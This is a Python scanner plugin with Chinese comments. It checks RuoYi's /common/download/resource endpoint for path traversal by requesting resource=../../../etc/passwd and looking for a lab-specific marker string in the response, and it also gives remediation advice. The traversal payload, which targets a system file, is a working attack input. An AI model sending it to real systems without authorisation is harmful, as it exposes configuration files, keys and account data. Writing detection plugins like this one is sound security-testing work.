# 文件下载路径穿越：若依 /common/download/resource 接口 resource 参数未过滤，可路径穿越读取任意文件
# 漏洞原因：/common/download/resource 接口的 resource 参数未做目录穿越校验，
#   攻击者构造 resource=../../../etc/passwd 即可跳出下载根目录读取系统任意文件，
#   泄露 /etc/passwd、配置文件、密钥等敏感信息。
# 本插件仅做存在性验证：GET 下载接口传入穿越路径，检测响应签名判定是否可越权读取。
from plugins.base import PluginBase
from core.models import ScanResult, STATUS_CONFIRMED, STATUS_SAFE, STATUS_UNKNOWN
from lib.colors import ok, no
from lib.http import join_url

# 漏洞命中签名（与 lab/server.py vuln 模式一致）
FILE_READ_PATH_MARKER = 'ruoyi-file-read-path-confirmed'


class RuoyiFileReadPathPlugin(PluginBase):
    name = '文件下载路径穿越'
    cve = ''
    severity = 'high'
    category = 'vuln'
    description = (
        '若依 /common/download/resource 接口 resource 参数未过滤，'
        '可路径穿越读取任意文件（如 /etc/passwd、配置文件）'
    )
    fix = (
        '严格校验 resource 参数，禁止 .. 目录穿越；'
        '下载接口强制鉴权；白名单限制可访问目录；规范化路径后校验是否在允许根目录内'
    )

    def verify(self, target, session):
        url = join_url(target, '/common/download/resource?resource=../../../etc/passwd')
        try:
            resp = session.get(url)
        except Exception as e:
            print(no('文件下载路径穿越（网络异常）'))
            return ScanResult(kind='vuln', name=self.name, status=STATUS_UNKNOWN,
                              url=url, evidence=str(e))

        text = resp.text or ''
        code = getattr(resp, 'status_code', 0)

        # 响应含签名 marker → 确认路径穿越可读取任意文件
        if FILE_READ_PATH_MARKER in text:
            print(ok('存在文件下载路径穿越漏洞'))
            return ScanResult(
                kind='vuln', name=self.name, severity=self.severity,
                status=STATUS_CONFIRMED, url=url,
                evidence=f'响应含路径穿越签名：{FILE_READ_PATH_MARKER}',
                fix=self.fix,
            )

        # 无 marker/404 → SAFE（接口已修复或不存在）
        if code == 404:
            reason = 'HTTP 404 端点不存在'
        else:
            reason = f'响应未含签名 marker（HTTP {code}）'
        print(no(f'不存在文件下载路径穿越漏洞（{reason}）'))
        return ScanResult(kind='vuln', name=self.name, status=STATUS_SAFE, url=url,
                          evidence=reason)
